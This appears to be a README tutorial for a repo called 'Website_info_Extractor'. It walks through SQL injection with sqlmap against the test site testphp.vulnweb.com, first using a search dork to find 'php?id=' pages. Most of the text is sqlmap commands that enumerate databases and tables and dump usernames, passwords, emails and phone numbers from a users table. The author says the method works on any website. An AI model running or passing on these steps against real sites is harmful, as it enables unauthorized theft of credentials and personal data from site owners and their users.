# Website_info_Extractor
This is tried on tester website but you can do on any of the website to extract the data from the database.

open browser

searching for vulnweb.com open it now copy the link
paste the link in new tab with some changes sidte:link/ php?id= ex.(site:http://testphp.vulnweb.com/ php?id=) now you get some link copy first link.

now open your kali terminal give root permission to terminal

now follow the commands

sudo su

sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 --dbs

sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D --tables    #(show tables)

sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C uname --dump  #(show users)

sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C pass --dump   #(show password)

sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C email --dump    #(show email)

sqlmap -u http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C phone --dump    #(show phone no.)

for practical video go to my youtube channel @Hackudozone
